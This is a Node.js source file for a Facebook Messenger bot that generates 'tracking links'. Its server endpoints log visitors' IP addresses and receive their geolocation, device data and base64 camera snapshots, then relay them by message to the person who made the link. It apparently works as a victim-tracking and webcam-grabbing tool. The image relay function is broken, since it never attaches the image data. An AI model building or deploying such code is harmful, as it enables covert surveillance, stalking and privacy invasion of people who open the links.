require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const PAGE_ACCESS_TOKEN = process.env.PAGE_ACCESS_TOKEN;
const VERIFY_TOKEN = process.env.VERIFY_TOKEN;
const hostURL = "YOUR_URL_HERE"; // Replace with your URL

// Webhook verification
app.get("/webhook", (req, res) => {
    const mode = req.query["hub.mode"];
    const token = req.query["hub.verify_token"];
    const challenge = req.query["hub.challenge"];

    if (mode && token) {
        if (mode === "subscribe" && token === VERIFY_TOKEN) {
            console.log("WEBHOOK_VERIFIED");
            res.status(200).send(challenge);
        } else {
            res.sendStatus(403);
        }
    }
});

// Webhook event handling
app.post("/webhook", (req, res) => {
    const body = req.body;

    if (body.object === "page") {
        body.entry.forEach(entry => {
            const webhookEvent = entry.messaging[0];
            const senderId = webhookEvent.sender.id;

            if (webhookEvent.message && webhookEvent.message.text) {
                handleMessage(senderId, webhookEvent.message);
            } else if (webhookEvent.postback) {
                handlePostback(senderId, webhookEvent.postback);
            }
        });

        res.status(200).send("EVENT_RECEIVED");
    } else {
        res.sendStatus(404);
    }
});

// Function to handle received messages
function handleMessage(senderId, receivedMessage) {
    let response;

    if (receivedMessage.text.toLowerCase() === "/start") {
        response = {
            text: `Welcome! Use this bot to create tracking links. Type /create to start.`
        };
    } else if (receivedMessage.text.toLowerCase() === "/create") {
        response = { text: `🌐 Please enter your URL:` };
    } else if (receivedMessage.text.toLowerCase() === "/help") {
        response = {
            text: `Instructions:\n1. Use /create to start.\n2. Enter a URL to generate tracking links.\n\nNote: This bot gathers info like location and device data.`
        };
    } else {
        response = { text: `Unknown command.` };
    }

    callSendAPI(senderId, response);
}

// Function to handle postback responses
function handlePostback(senderId, receivedPostback) {
    let response;

    if (receivedPostback.payload === "CREATE_NEW") {
        response = { text: `🌐 Enter Your URL` };
    }

    callSendAPI(senderId, response);
}

// Function to send messages to the Facebook API
function callSendAPI(senderId, response) {
    fetch(`https://graph.facebook.com/v12.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            recipient: { id: senderId },
            message: response,
        }),
    })
        .then((res) => res.json())
        .then((json) => console.log(json))
        .catch((err) => console.error("Error sending message:", err));
}

// Endpoint for generating links
app.get("/w/:path/:uri", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.ip;
    const url = Buffer.from(req.params.uri, "base64").toString("utf-8");

    res.json({
        ip,
        time: new Date().toISOString(),
        url,
        uid: req.params.path,
        a: hostURL,
        t: false // set as needed for toggling features
    });
});

// Endpoint for location data
app.post("/location", (req, res) => {
    const { lat, lon, uid, acc } = req.body;

    if (lat && lon && uid && acc) {
        callSendAPI(parseInt(uid, 36), {
            text: `Location data received:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`
        });
        res.send("Location sent");
    } else {
        res.status(400).send("Invalid data");
    }
});

// Endpoint to process other data
app.post("/", (req, res) => {
    const { uid, data } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.ip;

    if (uid && data && data.includes(ip)) {
        const formattedData = data.replaceAll("<br>", "\n");
        callSendAPI(parseInt(uid, 36), { text: formattedData });
        res.send("Data sent");
    } else {
        res.status(400).send("Invalid data");
    }
});

// Image processing endpoint for camera snapshots
app.post("/camsnap", (req, res) => {
    const { uid, img } = req.body;

    if (uid && img) {
        const buffer = Buffer.from(img, "base64");
        sendImage(parseInt(uid, 36), buffer);
        res.send("Image sent");
    } else {
        res.status(400).send("Invalid data");
    }
});

// Function to send images to Facebook Messenger
function sendImage(senderId, buffer) {
    fetch(`https://graph.facebook.com/v12.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            recipient: { id: senderId },
            message: {
                attachment: {
                    type: "image",
                    payload: {
                        is_reusable: true
                    }
                }
            }
        })
    })
        .then(res => res.json())
        .then(json => {
            if (json.error) {
                console.error("Error sending image:", json.error);
            }
        })
        .catch(err => console.error("Error sending image:", err));
}

// Start the server
app.listen(5000, () => {
    console.log("Server is running on port 5000");
});
                          
